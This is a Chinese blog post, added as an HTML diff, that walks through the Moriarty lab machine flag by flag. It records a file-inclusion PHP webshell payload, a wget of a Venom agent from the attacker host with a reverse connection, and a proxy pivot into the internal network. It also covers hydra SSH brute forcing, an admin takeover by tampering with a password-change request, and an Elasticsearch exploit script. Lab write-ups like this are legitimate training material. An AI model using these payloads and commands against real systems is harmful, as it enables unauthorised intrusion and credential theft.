@@ -1,0 +1,307 @@
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,inital-scale=1,user-scalable=no">
+  <title>Moriarty靶机(Elasticsearch)搭隧道 [ Hexo ]</title>
+  <!-- bootstrapcss文件 -->
+ <!--  <link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"> -->
+<!--   
+<link rel="stylesheet" href="/css/zhl.css">
+
+ -->
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="/css/fork-awesome.min.css">
+    
+      <link rel="stylesheet" href="/css/zhl.css">
+    
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+<div class="container-fluid">
+  <div class="row">
+  <div id="wrap" class="col-md-12">
+    <div id="header">
+	<div id="header-left">
+	<h1 id="header-title"> 
+	<a href="/">
+		Hexo
+	</a>
+	</h1>
+	
+	</div>
+	<div id="header-right">
+		
+		
+		<a href="/"  title="home"><i class="fa fa-home ">home</i></a>
+		
+		<a target="_blank" rel="noopener" href="https://github.com/moyan222/moyan222.github.io"  title="demo"><i class="fa fa-code ">demo</i></a>
+		
+		<a href="/about"  title="about"><i class="fa fa-user ">about</i></a>
+		
+		<a href="/"  title="music"><i class="fa fa-music ">music</i></a>
+		
+		
+	</div>
+</div>
+
+  </div>
+  </div>
+  <div id="content" class="row">
+    <div id="content-left" class="col-md-4">
+      
+
+	
+
+	
+	<div class="widget-wrap">
+		<h3 class="widget-title fa fa-tags">标签</h3>
+		<div class="widget tags">
+		<a class="tag-span-link" href="/tags/ACL/" rel="tag">ACL<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/ARP%E6%8A%93%E5%8C%85/" rel="tag">ARP抓包<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/HTML/" rel="tag">HTML<span class="tag-span-count">6</span></a> <a class="tag-span-link" href="/tags/JS/" rel="tag">JS<span class="tag-span-count">5</span></a> <a class="tag-span-link" href="/tags/PHP/" rel="tag">PHP<span class="tag-span-count">2</span></a> <a class="tag-span-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入<span class="tag-span-count">8</span></a> <a class="tag-span-link" href="/tags/STP/" rel="tag">STP<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/VLAN/" rel="tag">VLAN<span class="tag-span-count">2</span></a> <a class="tag-span-link" href="/tags/http%E8%AF%B7%E6%B1%82-%E7%81%AB%E7%8B%90%E4%BB%A3%E7%90%86%E5%AE%89%E8%A3%85/" rel="tag">http请求+火狐代理安装<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/markdown%E8%AF%AD%E6%B3%95/" rel="tag">markdown语法<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集<span class="tag-span-count">8</span></a> <a class="tag-span-link" href="/tags/%E5%85%B3%E4%BA%8E%E4%B8%BB%E9%A2%98/" rel="tag">关于主题<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E5%88%86%E4%BA%AB%E7%AC%94%E8%AE%B0/" rel="tag">分享笔记<span class="tag-span-count">4</span></a> <a class="tag-span-link" href="/tags/%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/" rel="tag">博客的搭建<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E5%9B%BE%E5%BA%8A%E7%9A%84%E6%90%AD%E5%BB%BA/" rel="tag">图床的搭建<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库<span class="tag-span-count">3</span></a> <a class="tag-span-link" href="/tags/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/" rel="tag">数据通信网络基础<span class="tag-span-count">6</span></a> <a class="tag-span-link" href="/tags/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/" rel="tag">永恒之蓝<span class="tag-span-count">2</span></a> <a class="tag-span-link" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现<span class="tag-span-count">2</span></a> <a class="tag-span-link" href="/tags/%E7%AB%AF%E5%8F%A3/" rel="tag">端口<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" rel="tag">计算机基础<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88/" rel="tag">链路聚合<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1/" rel="tag">静态路由<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/" rel="tag">靶机笔记<span class="tag-span-count">9</span></a>
+		</div>
+	</div>
+
+
+	
+	<div class="widget-wrap">
+		<h3 class="widget-title fa fa-archive">归档</h3>
+		<div class="widget">
+			<ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023</a><span class="archive-list-count">72</span></li></ul>
+		</div>
+	</div>
+
+
+
+    </div>
+    <div id="content-right" class="col-md-8">
+    
+<article id="post">
+	<div class="post-title">
+  <h1>Moriarty靶机(Elasticsearch)搭隧道</h1>
+  	</div>
+  <div class="page-meta">
+  	<span class="fa-wrap">
+  		<i class="fa fa-clock-o"></i>
+  		<span class="date-meta">2023-10-28</span>
+  	</span>
+  	<span class="fa-wrap">
+  		
+  		<i class="fa fa-tags"></i>
+  		<span class="tags-meta">靶机笔记</span>
+  		
+  	</span>
+  	<span class="fa-wrap">
+  		
+  	</span>
+  </div>
+  <div class="post-content">
+  <p>目录</p>
+<p><a href="#_Toc146226496">Moriaty靶机步骤… 1</a></p>
+<p><a href="#_Toc146226497">1.扫描本地局域网查找靶机IP. 1</a></p>
+<p><a href="#_Toc146226498">2.扫描端口… 2</a></p>
+<p><a href="#_Toc146226499">flag1. 2</a></p>
+<p><a href="#_Toc146226500">访问8000端口… 2</a></p>
+<p><a href="#_Toc146226501">flag2. 3</a></p>
+<p><a href="#_Toc146226502">1. 根据提示：目标靶机开放在80端口… 3</a></p>
+<p><a href="#_Toc146226503">2.访问80端口… 4</a></p>
+<p><a href="#_Toc146226504">3.文件包含… 4</a></p>
+<p><a href="#_Toc146226505">flag3. 8</a></p>
+<p><a href="#_Toc146226506">flag4. 16</a></p>
+<p><a href="#_Toc146226507">flag5. 21</a></p>
+<p><a href="#_Toc146226508">flag6. 25</a></p>
+<h1 id="Moriaty靶机步骤"><a href="#Moriaty靶机步骤" class="headerlink" title="Moriaty靶机步骤"></a>Moriaty靶机步骤</h1><h2 id="1-扫描本地局域网查找靶机IP"><a href="#1-扫描本地局域网查找靶机IP" class="headerlink" title="1.扫描本地局域网查找靶机IP"></a>1.扫描本地局域网查找靶机IP</h2><p>  <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282118733.png" alt="image-20231028211811526">                             </p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282118733.png" alt="image-20231028211819826"></p>
+<h2 id="2-扫描端口"><a href="#2-扫描端口" class="headerlink" title="2.扫描端口"></a>2.扫描端口</h2><p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282118753.png" alt="image-20231028211826935"></p>
+<h1 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h1><h2 id="访问8000端口"><a href="#访问8000端口" class="headerlink" title="访问8000端口"></a>访问8000端口</h2><p>发现第一个flag,复制flag{start}输入即可</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282118198.png" alt="image-20231028211847348"></p>
+<h1 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h1><h2 id="1-根据提示：目标靶机开放在80端口"><a href="#1-根据提示：目标靶机开放在80端口" class="headerlink" title="1.  根据提示：目标靶机开放在80端口"></a>1.  根据提示：目标靶机开放在80端口</h2><p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282119531.png" alt="image-20231028211914766"></p>
+<p>扫描80端口</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282119145.png" alt="image-20231028211905091"></p>
+<h2 id="2-访问80端口"><a href="#2-访问80端口" class="headerlink" title="2.访问80端口"></a>2.访问80端口</h2><p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282119627.png" alt="image-20231028211941911"></p>
+<h2 id="3-文件包含"><a href="#3-文件包含" class="headerlink" title="3.文件包含"></a>3.文件包含</h2><p>看到?file&#x3D;page1.html马上想到文件包含</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282119199.png" alt="image-20231028211951927"></p>
+<p>利用?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd确认存在文件包含</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282120555.png" alt="image-20231028211959860"></p>
+<p>\1.  方法1：执行一句话木马用蚁剑连接</p>
+<p>使用<strong>代码执行</strong>**(****实用)**命令data:text&#x2F;plain,<?php phpinfo();?> &#x2F;&#x2F;显示phpinfo文件</p>
+<p>还可以使用<strong>代码执行</strong>命令执行一句话木马?file&#x3D;data:text&#x2F;plain,<?php @eval($_POST['pw']); ?>然后用蚁剑连接</p>
+<p><strong>URL****整条直接复制</strong></p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282120554.png" alt="image-20231028212008207"></p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282120579.png" alt="image-20231028212016701"></p>
+<p>进入之后在根目录下找到flag</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282120472.png" alt="image-20231028212025689"></p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282120772.png" alt="image-20231028212036047"></p>
+<p>复制flag回到8000端口填写即可</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282120561.png" alt="image-20231028212040639"></p>
+<p>进入下一关</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282120989.png" alt="image-20231028212047593"></p>
+<p>根据提示，目标靶机在内网172.17.0.3-254上</p>
+<h1 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h1><p>\2.  利用Venom让靶机上线</p>
+<p>使用Venom建立通信隧道</p>
+<p>启动Venom服务端，开启监听</p>
+<p>在kali中的Venom目录下打开终端</p>
+<p>**chmod +x admin_linux_x64 &#x2F;&#x2F;**<strong>赋予admin_linux_x64执行权限</strong></p>
+<p>**.&#x2F;admin_linux_x64 -lport 9999 &#x2F;&#x2F;**<strong>运行名为 ‘admin_linux_x64’ 的可执行文件，并指定监听的端口为9999</strong></p>
+<p><strong>开启python服务python -m http.server 80</strong></p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282121977.png" alt="image-20231028212102212"></p>
+<p>cd &#x2F;tmp 在靶机上进入临时目录tmp</p>
+<p>wget <a target="_blank" rel="noopener" href="http://192.168.56.102/agent_linux_x64">http://192.168.56.102/agent_linux_x64</a> 在靶机上下载木马agent_linux_x64准备上线</p>
+<p>chmod +x agent_linux_x64 先给木马执行权限</p>
+<p>.&#x2F;agent_linux_x64 -rhost 192.168.56.102 -rport 9999  &#x2F;&#x2F;运行木马上线</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282121011.png" alt="image-20231028212134082"></p>
+<p><strong>Venom****服务端可以看到有节点上线，开启Kali本地socks侦听端口1080</strong></p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282121122.png" alt="image-20231028212142352"></p>
+<p>show</p>
+<p>goto 1</p>
+<p>socks 1080</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282121985.png" alt="image-20231028212147157"></p>
+<p>\3.  Kali挂Proxychains扫描内网</p>
+<p>vi &#x2F;etc&#x2F;proxychains4.conf 修改Proxychains配置文件</p>
+<p>修改最后一行配置文件为：</p>
+<p>socks5 127.0.0.1 1080</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282122728.png" alt="image-20231028212203806"></p>
+<p>\4.  扫描内外目标IP地址</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282122793.png" alt="image-20231028212211910"></p>
+<p><strong>浏览器配置代理访问172.17.0.4的页面(这里在物理机上抓包)</strong></p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282122162.png" alt="image-20231028212229178"></p>
+<p>开启http拦截，选择上传shell文件，随便输入上传密码，点击上传</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282122837.png" alt="image-20231028212235796"></p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282122221.png" alt="image-20231028212244442"></p>
+<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282123325.png" alt="image-20231028212300069"></p>
+<p>密码为password</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282123695.png" alt="image-20231028212306932"></p>
+<p>\5.  输入正确的密码password登录</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282123891.png" alt="image-20231028212316207"></p>
+<p>将蚁剑设置代理</p>
+<p>socks5 192.168.56.102 1080</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282123974.png" alt="image-20231028212322207"></p>
+<p>复制shell.php地址连接蚁剑成功</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282123993.png" alt="image-20231028212330790"></p>
+<p>在根目录下找到2_flag.txt</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282123087.png" alt="image-20231028212341341"></p>
+<p>复制flag{picture_is_worth_1000_words}填入进入即可</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282123959.png" alt="image-20231028212354094"></p>
+<h1 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h1><p>\6.  挂代理扫描内网开启22端口的主机</p>
+<p>proxychains nmap -p22 -sT –Pn 172.17.0.4-254</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282124128.png" alt="image-20231028212402299"></p>
+<p>\7.  写入用户名到user.txt准备爆破</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282124485.png" alt="image-20231028212411514"></p>
+<p><strong>vi user.txt</strong></p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282124590.png" alt="image-20231028212417745"></p>
+<p>\8.  将密码采用在线MD5解密并将明文写入pass.txt</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282124803.png" alt="image-20231028212424974"></p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282124228.png" alt="image-20231028212433408"></p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282124623.png" alt="image-20231028212437879"></p>
+<p>\9.  使用hydra暴力破解ssh</p>
+<p>经过爆破得知用户名为root对应密码为weapons</p>
+<p>proxychains hydra -L user.txt -P pass.txt ssh:&#x2F;&#x2F;172.17.0.5 -t 4</p>
+<p>-t：设置并发数</p>
+<p>不能太高</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282124427.png" alt="image-20231028212451640"></p>
+<p>\10. 使用ssh登录目标靶机</p>
+<p>proxychains ssh <a href="mailto:root@172.17.0.5">root@172.17.0.5</a></p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282124576.png" alt="image-20231028212458235"></p>
+<p>进入根目录cd &#x2F;</p>
+<p>ls查看根目录下的内容，发现flag</p>
+<p>cat 3_flag.txt的内容为</p>
+<p>flag{what_weapons}</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282125548.png" alt="image-20231028212519529"></p>
+<p>提交flag进入下一关</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282125218.png" alt="image-20231028212526295"></p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282125242.png" alt="image-20231028212537445"></p>
+<h1 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h1><p>根据提示：目标靶机可能在443,8000,8080,8888.端口上，目标账号密码是buyer13:arms13</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282125274.png" alt="image-20231028212544022"></p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282125309.png" alt="image-20231028212553568"></p>
+<p>经扫描得知，目标主机为172.17.0.8:8000 http服务</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282126820.png" alt="image-20231028212602016"></p>
+<p>访问目标主机:172.17.0.8:8000并输入用户名buyer13和密码arms13</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282126582.png" alt="image-20231028212621933"></p>
+<p>尝试点击Chats,可以发现管理员用户为admin</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282126087.png" alt="image-20231028212632284"></p>
+<p>进入修改密码界面进行抓包()</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282126129.png" alt="image-20231028212639673"></p>
+<p>将用户名修改为admin后放包</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282126671.png" alt="image-20231028212645734"></p>
+<p>放包后新建一个隐私页面或者更换没有登录过该网页的浏览器</p>
+<p>用admin登录后点击chats即可看到flag</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282126841.png" alt="image-20231028212653109"></p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282127273.png" alt="image-20231028212702534"></p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282127300.png" alt="image-20231028212712425"></p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282127128.png" alt="image-20231028212721342"></p>
+<h1 id="flag6"><a href="#flag6" class="headerlink" title="flag6"></a>flag6</h1><p>\1.  扫描172.17.0.3-254，指定端口为9200</p>
+<p>根据信息：内网存在Elasticsearch服务（工作在TCP9200端口）</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282127269.png" alt="image-20231028212729772"></p>
+<p>扫描发现目标主机为172.17.0.10:9200</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282127573.png" alt="image-20231028212737713"></p>
+<p>访问172.17.0.10:9200</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282127031.png" alt="image-20231028212747246"></p>
+<p>\2. 老Elasticsearch软件版本存在很多漏洞，搜索可利用攻击脚本</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282127580.png" alt="image-20231028212753889"></p>
+<p>先查看36337.py脚本可以发现目标靶机是使用python2作为解析器</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282128878.png" alt="image-20231028212800884"></p>
+<p><strong>为了能让36337.py脚本能正常执行，先要写入一条数据</strong></p>
+<p>proxychains curl -XPOST ‘172.17.0.10:9200&#x2F;twitter&#x2F;user&#x2F;yren’ -d ‘{“name”:”zyh”}’</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282128811.png" alt="image-20231028212811818"></p>
+<p>proxychains python2 36337.py 172.17.0.10  &#x2F;&#x2F;执行攻击脚本</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282128751.png" alt="image-20231028212818823"></p>
+<p>ls查看得到flag</p>
+<p>cat查看flag内容后复制填入过关即可</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282128969.png" alt="image-20231028212828124"></p>
+<p>cat 6_flag.txt</p>
+<p> <img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282128923.png" alt="image-20231028212837114"></p>
+<p>结束</p>
+
+	</div>
+</article>
+
+
+
+    </div>
+  </div>
+  <div class="row">
+<div id="bottom" class="col-md-12"> 
+  <div class="bottom-nav">
+	
+	
+	<a href="https://github.com/lizehongss" class="fa fa-github fa-2x" target="_blank" title="Follow me" ></a>
+	
+	
+</div>
+<div class="bottom-info">
+	&copy; 2023 John Doe<br>
+	Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+	theme <a href="https://github.com/lizehongss/hexo-theme-zhl" target="_blank">zhl</a>
+</div>
+</div>
+</div>
+</div>
+<div id="tool">
+  <ul>
+    <li class="fa fa-angle-up top" id="top"></li>
+  </ul>
+</div>
+  <div class="bg_content">
+    <canvas id="canvas"></canvas>
+  </div>
+  
+  <!-- scripts list from theme config.yml -->
+  
+    <script src="/js/zhl.js"></script>
+  
+    <script src="/js/bj.js"></script>
+  
+
+<!-- jQ cdn  -->
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<!-- bootstrap js cdn-->
+<!-- <script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script> -->
+
+
+</body>
+</html>
